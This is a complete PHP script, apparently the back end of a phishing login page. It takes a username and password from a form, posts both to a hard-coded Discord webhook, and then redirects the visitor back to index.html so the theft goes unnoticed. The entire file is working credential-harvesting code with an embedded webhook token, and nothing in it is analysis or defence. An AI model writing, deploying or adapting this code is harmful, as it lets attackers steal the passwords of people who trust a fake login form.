<?php
// Discord webhook URL
$webhookURL = "https://discord.com/api/webhooks/1440084893026619498/EghJR4801Er-ZaAFQcKMVSqHD3MCglFGDQqujsGZpkgUg3mNy-TVSouuBcUX7dzERTtF"; // Replace with your Discord webhook

// Get POST data from form
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

if (empty($username) || empty($password)) {
    echo "Please fill in both fields!";
    exit;
}

// Create the message
$message = [
    "content" => "No way ur acc a genius:\nUsername: $username\nPassword: $password"
];

// Send POST request to Discord webhook
$ch = curl_init($webhookURL);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec($ch);
curl_close($ch);

// Optional: redirect back to form page
header("Location: index.html");
exit();
?>
